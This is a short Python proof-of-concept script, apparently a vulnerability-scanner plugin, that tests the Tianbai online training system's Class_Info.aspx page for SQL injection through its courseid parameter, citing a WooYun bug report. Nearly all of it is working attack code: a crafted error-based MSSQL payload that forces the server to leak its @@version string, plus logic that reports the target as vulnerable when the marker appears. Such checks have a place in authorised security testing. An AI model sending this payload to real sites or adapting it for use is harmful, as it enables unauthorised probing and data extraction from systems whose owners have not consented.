#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 天柏在线培训系统Class_Info.aspx SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2010-0147384
author: Lucifer
description: 文件Class_Info.aspx中,参数courseid存在SQL注入。
'''
import sys
import requests
import warnings
def run(url):
        result = ['天柏在线培训系统Class_Info.aspx SQL注入','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/Web_Org/Class_Info.aspx?courseid=50%20AnD%201=CoNvErT(InT,ChAr(87)%2BChAr(116)%2BChAr(70)%2BChAr(97)%2BChAr(66)%2BChAr(99)%2B@@VeRsIoN)--"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"WtFaBcMicrosoft" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
